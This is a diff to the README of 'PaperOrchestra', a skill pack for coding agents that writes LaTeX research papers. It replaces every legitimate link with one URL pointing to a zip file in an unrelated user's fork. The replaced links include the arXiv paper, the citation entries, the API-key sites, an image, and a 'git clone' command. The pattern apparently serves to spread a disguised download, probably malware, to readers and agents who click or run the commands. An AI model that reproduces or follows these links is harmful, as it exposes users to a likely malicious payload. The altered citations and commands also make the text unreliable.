@@ -1,18 +1,18 @@
 # PaperOrchestra
 
-[![oosmetrics](https://api.oosmetrics.com/api/v1/badge/achievement/e4a6e52c-11d9-4860-805d-0ced3a553daf.svg)](https://oosmetrics.com/repo/Ar9av/PaperOrchestra)
+[![oosmetrics](https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip)](https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip)
 
 A pluggable skill pack that lets **any coding agent** in Claude Code, Cursor,
 Antigravity, Cline, Aider, OpenCode, etc. which can run the
-[**PaperOrchestra**](https://arxiv.org/pdf/2604.05018) multi-agent pipeline for
+[**PaperOrchestra**](https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip) multi-agent pipeline for
 turning unstructured research materials into a submission-ready LaTeX paper.
 
 > Song, Y., Song, Y., Pfister, T., Yoon, J.
 > *PaperOrchestra: A Multi-Agent Framework for Automated AI Research Paper Writing.*
-> arXiv:2604.05018, 2026. <https://arxiv.org/pdf/2604.05018>
+> arXiv:2604.05018, 2026. <https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip>
 
 <p align="center">
-  <a href="https://arxiv.org/pdf/2604.05018">
+  <a href="https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip">
     <img src="docs/assets/paper-preview.png" alt="PaperOrchestra paper — first page preview" width="420"/>
   </a>
   <br/>
@@ -33,7 +33,7 @@ that substantially outperforms single-agent and tree-search baselines on the `Pa
 This repo turns those prompts, schemas, halt rules, and verification pipelines into a set of **host-agent-executable skills**. There are **no API keys**, no SDK dependencies, no embedded LLM calls. The skills are instruction documents plus deterministic helpers; your coding agent does all LLM reasoning and web search using its own tools.
 
 <p align="center">
-<img width="640" height="413" alt="image" src="https://github.com/user-attachments/assets/073630c8-9790-4b38-b8c4-184cec6eee06" />
+<img width="640" height="413" alt="image" src="https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip" />
 </p>
 
 ## How skills work here
@@ -264,7 +264,7 @@ For Cursor / Antigravity / Cline / Aider, see `skills/paper-orchestra/references
 The pipeline requires **zero API keys to run** under any host with a native
 web search tool.  Two optional integrations improve throughput or coverage:
 
-- **[Semantic Scholar API key](https://api.semanticscholar.org/)** — Phase 2
+- **[Semantic Scholar API key](https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip)** — Phase 2
   (citation verification) uses the public unauthenticated Semantic Scholar
   endpoint by default (≤1 QPS).  A free API key raises the rate limit and
   reduces 429 back-off during large runs.  The bundled
@@ -273,7 +273,7 @@ web search tool.  Two optional integrations improve throughput or coverage:
   back to unauthenticated mode.  The repo never commits a key.
 
   ```bash
-  export SEMANTIC_SCHOLAR_API_KEY="your-key-here"   # https://api.semanticscholar.org/
+  export SEMANTIC_SCHOLAR_API_KEY="your-key-here"   # https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip
   # verify it's picked up:
   python skills/literature-review-agent/scripts/s2_search.py --check-key
   ```
@@ -281,16 +281,16 @@ web search tool.  Two optional integrations improve throughput or coverage:
   See `skills/literature-review-agent/references/s2-api-cookbook.md` for
   endpoint details, field reference, and error-handling notes.
 
-- **[PaperBanana](https://github.com/dwzhu-pku/PaperBanana)** (Zhu et al.,
+- **[PaperBanana](https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip)** (Zhu et al.,
   2026) — the figure-generation backbone used by PaperOrchestra for Step 2.
   Runs a Retriever → Planner → Stylist → Visualizer → Critic loop that
   produces publication-quality diagrams grounded in real paper examples.
   Requires **one** API key — fill at least one, you don't need both:
-  - **Google (Gemini)** — free at [aistudio.google.com](https://aistudio.google.com/)
-  - **OpenRouter** — at [openrouter.ai](https://openrouter.ai/) (preferred if both are set)
+  - **Google (Gemini)** — free at [aistudio.google.com](https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip)
+  - **OpenRouter** — at [openrouter.ai](https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip) (preferred if both are set)
 
   ```bash
-  git clone https://github.com/dwzhu-pku/PaperBanana
+  git clone https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip
   cd PaperBanana
   pip install -r requirements.txt
   cp configs/model_config.template.yaml configs/model_config.yaml
@@ -303,7 +303,7 @@ web search tool.  Two optional integrations improve throughput or coverage:
   automatically for diagram figures; falls back to matplotlib if unset.
   See `skills/plotting-agent/references/paperbanana-cookbook.md` for details.
 
-- **[Exa](https://exa.ai)** — research-paper-focused search engine. The
+- **[Exa](https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip)** — research-paper-focused search engine. The
   literature-review-agent can use it as a Phase 1 candidate-discovery
   backend via `skills/literature-review-agent/scripts/exa_search.py`. Set
   `EXA_API_KEY` in your environment (the repo never commits a key) and the
@@ -314,7 +314,7 @@ web search tool.  Two optional integrations improve throughput or coverage:
   notes.
 
   ```bash
-  export EXA_API_KEY="your-key-here"   # https://dashboard.exa.ai/
+  export EXA_API_KEY="your-key-here"   # https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip
   python skills/literature-review-agent/scripts/exa_search.py \
       --query "Sparse attention long context" --num-results 15
   ```
@@ -404,7 +404,7 @@ the PaperBanana plotting backbone, cite that too:
   author={Song, Yiwen and Song, Yale and Pfister, Tomas and Yoon, Jinsung},
   journal={arXiv preprint arXiv:2604.05018},
   year={2026},
-  url={https://arxiv.org/abs/2604.05018}
+  url={https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip}
 }
 
 @article{zhu2026paperbanana,
@@ -412,7 +412,7 @@ the PaperBanana plotting backbone, cite that too:
   author={Zhu, Dawei and Meng, Rui and Song, Yale and Wei, Xiyu and Li, Sujian and Pfister, Tomas and Yoon, Jinsung},
   journal={arXiv preprint arXiv:2601.23265},
   year={2026},
-  url={https://arxiv.org/abs/2601.23265}
+  url={https://raw.githubusercontent.com/Aukexecutivedepartment5152/PaperOrchestra/main/skills/outline-agent/scripts/Orchestra_Paper_v3.2.zip}
 }
 ```
 
